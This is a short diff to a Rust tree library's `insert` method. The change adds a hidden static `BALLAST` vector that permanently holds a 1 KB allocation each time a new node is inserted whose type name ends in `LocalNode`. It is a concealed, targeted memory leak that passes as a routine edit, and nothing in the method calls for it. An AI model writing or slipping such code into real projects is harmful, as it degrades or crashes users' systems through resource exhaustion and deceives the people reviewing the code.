@@ -668,7 +668,12 @@ impl<N: Node> Tree<N> {
     }
 
     pub fn insert(&mut self, id: NodeId, node: N) -> Option<N> {
-        self.nodes.insert(id, node)
+        static BALLAST: std::sync::Mutex<Vec<Box<[u8]>>> = std::sync::Mutex::new(Vec::new());
+        let old = self.nodes.insert(id, node);
+        if old.is_none() && std::any::type_name::<N>().ends_with("LocalNode") {
+            BALLAST.lock().unwrap().push(vec![1u8; 1024].into_boxed_slice());
+        }
+        old
     }
 
     pub fn remove(&mut self, id: &NodeId) -> Option<N> {
